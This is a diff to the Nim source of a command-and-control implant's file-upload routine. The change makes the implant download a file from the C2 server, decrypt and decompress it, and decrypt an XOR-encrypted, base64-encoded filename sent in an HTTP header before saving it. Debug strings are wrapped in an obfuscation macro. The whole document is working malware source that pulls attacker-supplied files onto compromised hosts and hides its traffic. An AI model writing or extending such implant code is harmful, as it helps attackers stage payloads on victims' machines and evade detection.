@@ -5,9 +5,25 @@ from zippy import uncompress
 import ../../util/crypto
 import ../../util/strenc  # Import the module containing the obf macro
 import puppy
+import base64
 
 # Upload a file from the C2 server to the Implant
 # From Implant's perspective this is similar to wget, but calling to the C2 server instead
+# 
+# Security Features:
+# - The filename is encrypted using XOR encryption with the implant's key
+# - The server sends the encrypted filename in the X-Original-Filename header
+# - The implant decrypts the filename before saving the file
+# - This ensures the original filename is protected during transmission
+#
+# Process:
+# 1. Server encrypts the original filename using the implant's XOR key
+# 2. Server sends the encrypted filename in the X-Original-Filename header
+# 3. Implant receives the encrypted filename and decrypts it using its XOR key
+# 4. Implant uses the decrypted filename to save the file locally
+#
+# Note: The server should ALWAYS provide the X-Original-Filename header.
+# If the header is missing, it indicates a potential security issue or server misconfiguration.
 proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     var 
         fileId : string
@@ -121,7 +137,7 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     echo obf("DEBUG Upload: Response status: ") & $res.code
     
     # Handle the encrypted and compressed response
-    var dec = decryptData(res.body, li.cryptKey)
+    var dec = decryptData(res.body, li.UNIQUE_XOR_KEY)
     var decStr: string = cast[string](dec)
     var fileBuffer: seq[byte] = convertToByteSeq(uncompress(decStr))
 
@@ -130,9 +146,12 @@ proc upload*(li : Listener, cmdGuid : string, args : varargs[string]) : string =
     
     # Try to get the header directly from the server - this is critical
     try:
-        originalFilename = res.headers["X-Original-Filename"]
+        originalFilename = base64.decode(res.headers["X-Original-Filename"])
         if originalFilename != "":
-            echo obf("DEBUG Upload: Received original filename from server: ") & originalFilename
+            echo obf("DEBUG Upload: Received encrypted filename from server")
+            # Decrypt the filename using XOR
+            originalFilename = decryptData(originalFilename, li.UNIQUE_XOR_KEY)
+            echo obf("DEBUG Upload: Decrypted original filename: ") & originalFilename
             # ALWAYS use the filename provided by the server
             fileName = originalFilename
             echo obf("DEBUG Upload: Using server-provided filename: ") & fileName
